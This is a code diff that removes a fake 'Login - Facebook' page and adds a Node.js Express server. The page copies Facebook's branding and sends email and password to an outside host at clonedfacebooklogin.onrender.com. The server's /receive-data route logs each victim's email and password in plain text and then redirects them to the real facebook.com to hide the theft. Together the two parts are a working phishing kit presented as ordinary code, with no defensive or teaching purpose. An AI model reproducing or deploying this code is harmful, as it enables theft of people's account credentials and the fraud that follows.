@@ -1,25 +1,49 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
-    <title>Login - Facebook</title>
-</head>
-<body>
-    <div class="login-container">
-        <img class="fb-logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
-        <h2>Facebook helps you connect and share with the people in your life.</h2>
-        <form action="https://clonedfacebooklogin.onrender.com/receive-data" method="post">
-            <input type="text" name="email" placeholder="Email address or phone number" required>
-            <input type="password" name="pass" placeholder="Password" required>
-            <button type="submit">Log In</button>
-        </form>
-        <div class="footer-links">
-            <a href="#">Forgotten password?</a>
-            <a href="#">Create new account</a>
-        </div>
-    </div>
-    <script src="script.js"></script>
-</body>
-</html>
+const express = require('express');
+const path = require('path');
+const helmet = require('helmet'); // For security headers
+const bodyParser = require('body-parser');
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// Middleware for security headers
+app.use(helmet());
+
+// Body parser to handle form data
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+
+// Serve static files from the 'public' directory
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Force HTTPS (Redirect to HTTPS if HTTP is used)
+app.use((req, res, next) => {
+    if (req.headers['x-forwarded-proto'] !== 'https') {
+        return res.redirect(['https://', req.get('Host'), req.url].join(''));
+    }
+    next();
+});
+
+// Route to handle login form data
+app.post('/receive-data', (req, res) => {
+    const { email, pass } = req.body;
+    
+    // Sanitize inputs (basic)
+    if (!email || !pass) {
+        return res.status(400).send('Invalid input');
+    }
+
+    console.log(`Received email: ${email}, password: ${pass}`);
+    
+    // Redirect to an external site or another route
+    res.redirect('https://www.facebook.com');
+});
+
+// Serve the index.html file for the root route
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Start the server
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
